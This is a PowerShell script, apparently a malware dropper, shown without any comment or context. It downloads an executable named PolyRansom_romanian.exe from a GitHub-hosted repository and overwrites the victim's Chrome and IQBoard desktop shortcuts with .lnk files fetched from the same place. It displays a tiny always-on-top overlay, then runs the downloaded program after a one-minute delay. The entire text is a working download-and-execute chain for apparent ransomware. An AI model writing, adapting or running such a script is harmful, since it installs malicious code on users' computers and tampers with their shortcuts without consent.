$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $downloadPath)
$chromeUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Google%20Chrome.download"
$iqboardUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Software%20Educational%20IQBoard.download"

$chromeFileName = "Google Chrome.lnk"
$iqboardFileName = "Software Educational IQBoard.lnk"

$chromePath = "$env:USERPROFILE\Desktop\$chromeFileName"
$iqboardPath = "$env:USERPROFILE\Desktop\$iqboardFileName"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object System.Windows.Forms.Form
$form.StartPosition = 'Manual' 
$form.FormBorderStyle = 'None'
$form.BackColor = [System.Drawing.Color]::Lime
$form.TransparencyKey = $form.BackColor
$form.TopMost = $true
$form.Width = 50
$form.Height = 50 
$label = New-Object System.Windows.Forms.Label
$label.Text = "H"
$label.ForeColor = [System.Drawing.Color]::Green
$label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.BackColor = [System.Drawing.Color]::Transparent
$form.Controls.Add($label)
$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
$formLocationX = [int]$screenWidth - [int]$form.Width
$formLocationY = [int]$screenHeight - [int]$form.Height
$form.Location = New-Object System.Drawing.Point($formLocationX, $formLocationY)
$form.Add_MouseDown({
    $form.Capture = $false
})
$form.Show()

if (Test-Path $chromePath) {
    Remove-Item $chromePath -Force
}

if (Test-Path $iqboardPath) {
    Remove-Item $iqboardPath -Force
}

Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath

Invoke-WebRequest -Uri $iqboardUrl -OutFile $iqboardPath

Start-Sleep -Seconds 60

if (Test-Path $downloadPath) {
    Start-Process -FilePath $downloadPath -Wait
    Start-Sleep -Seconds 10
    
    $process = Get-Process | Where-Object {$_.MainModule.FileName -eq $downloadPath}
    
    if ($process) {
        $processName = $process.Name
        Write-Host "Process name found: $processName"
        Stop-Process -Name $processName -Force
        Write-Host "Process stopped."
    } else {
        Write-Host "Process associated with PolyRansom_romanian.exe not found."
    }
} else {
    Write-Host "Download path not found."
}
